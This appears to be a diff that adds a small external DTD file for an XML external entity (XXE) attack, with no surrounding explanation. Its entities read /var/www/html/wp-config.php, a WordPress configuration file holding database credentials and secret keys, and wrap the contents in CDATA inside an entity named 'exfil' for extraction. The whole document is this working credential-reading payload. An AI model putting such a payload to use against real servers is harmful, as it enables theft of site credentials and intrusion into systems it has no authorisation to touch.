@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///var/www/html/wp-config.php">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY exfil '%start;%file;%end;'>">
+%all;
